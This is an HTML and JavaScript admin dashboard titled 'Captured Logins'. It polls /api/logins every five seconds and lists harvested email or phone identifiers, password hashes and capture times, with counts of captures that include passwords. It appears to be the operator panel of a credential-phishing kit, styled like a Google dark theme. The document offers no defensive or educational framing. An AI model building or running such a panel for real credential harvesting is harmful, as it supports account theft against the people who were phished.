<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin - Captured Logins</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: system-ui, -apple-system, sans-serif;
      background-color: #202124;
      color: #e8eaed;
      padding: 20px;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
    }

    h1 {
      margin-bottom: 24px;
      color: #e8eaed;
      font-weight: 400;
    }

    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 16px;
      margin-bottom: 24px;
    }

    .stat-card {
      background: #2d3034;
      border: 1px solid #3c4043;
      border-radius: 8px;
      padding: 16px;
    }

    .stat-label {
      font-size: 0.875rem;
      color: #9aa0a6;
      margin-bottom: 8px;
    }

    .stat-value {
      font-size: 1.5rem;
      font-weight: 500;
      color: #8ab4f8;
    }

    .table-container {
      background: #2d3034;
      border: 1px solid #3c4043;
      border-radius: 8px;
      overflow: hidden;
    }

    table {
      width: 100%;
      border-collapse: collapse;
    }

    thead {
      background: #161616;
    }

    th {
      padding: 12px 16px;
      text-align: left;
      font-weight: 500;
      font-size: 0.875rem;
      color: #9aa0a6;
      border-bottom: 1px solid #3c4043;
    }

    td {
      padding: 12px 16px;
      border-bottom: 1px solid #3c4043;
      font-size: 0.875rem;
    }

    tbody tr:hover {
      background: #35373a;
    }

    tbody tr:last-child td {
      border-bottom: none;
    }

    .identifier {
      color: #e8eaed;
      font-weight: 500;
    }

    .timestamp {
      color: #9aa0a6;
      font-size: 0.8125rem;
    }

    .password-hash {
      color: #9aa0a6;
      font-family: 'Courier New', monospace;
      font-size: 0.75rem;
      word-break: break-all;
      max-width: 400px;
    }

    .has-password {
      color: #34a853;
    }

    .no-password {
      color: #9aa0a6;
    }

    .refresh-btn {
      margin-bottom: 16px;
      padding: 10px 20px;
      background: #8ab4f8;
      color: #202124;
      border: none;
      border-radius: 4px;
      font-weight: 500;
      cursor: pointer;
      transition: background 120ms ease;
    }

    .refresh-btn:hover {
      background: #aecbfa;
    }

    .loading {
      text-align: center;
      padding: 40px;
      color: #9aa0a6;
    }

    .empty {
      text-align: center;
      padding: 40px;
      color: #9aa0a6;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Captured Logins</h1>
    
    <button class="refresh-btn" onclick="loadLogins()">Refresh</button>
    
    <div class="stats" id="stats"></div>
    
    <div class="table-container">
      <div id="loading" class="loading">Loading...</div>
      <table id="logins-table" style="display: none;">
        <thead>
          <tr>
            <th>Email/Phone</th>
            <th>Password Hash</th>
            <th>Captured At</th>
          </tr>
        </thead>
        <tbody id="logins-body">
        </tbody>
      </table>
      <div id="empty" class="empty" style="display: none;">No logins captured yet.</div>
    </div>
  </div>

  <script>
    function formatDate(isoString) {
      const date = new Date(isoString);
      return date.toLocaleString();
    }

    function loadLogins() {
      document.getElementById('loading').style.display = 'block';
      document.getElementById('logins-table').style.display = 'none';
      document.getElementById('empty').style.display = 'none';

      fetch('/api/logins')
        .then(res => res.json())
        .then(data => {
          document.getElementById('loading').style.display = 'none';
          
          const entries = data.entries || [];
          
          // Update stats
          document.getElementById('stats').innerHTML = `
            <div class="stat-card">
              <div class="stat-label">Total Captures</div>
              <div class="stat-value">${entries.length}</div>
            </div>
            <div class="stat-card">
              <div class="stat-label">With Passwords</div>
              <div class="stat-value">${entries.filter(e => e.passwordHash).length}</div>
            </div>
            <div class="stat-card">
              <div class="stat-label">Email Only</div>
              <div class="stat-value">${entries.filter(e => !e.passwordHash).length}</div>
            </div>
          `;

          if (entries.length === 0) {
            document.getElementById('empty').style.display = 'block';
            return;
          }

          document.getElementById('logins-table').style.display = 'table';
          const tbody = document.getElementById('logins-body');
          tbody.innerHTML = entries.map(entry => `
            <tr>
              <td class="identifier">${entry.identifier}</td>
              <td>
                ${entry.passwordHash 
                  ? `<span class="has-password">âœ“</span> <span class="password-hash">${entry.passwordHash}</span>`
                  : '<span class="no-password">No password captured</span>'
                }
              </td>
              <td class="timestamp">${formatDate(entry.createdAt)}</td>
            </tr>
          `).join('');
        })
        .catch(err => {
          document.getElementById('loading').style.display = 'none';
          document.getElementById('empty').style.display = 'block';
          document.getElementById('empty').textContent = 'Error loading logins: ' + err.message;
        });
    }

    // Load on page load
    loadLogins();

    // Auto-refresh every 5 seconds
    setInterval(loadLogins, 5000);
  </script>
</body>
</html>
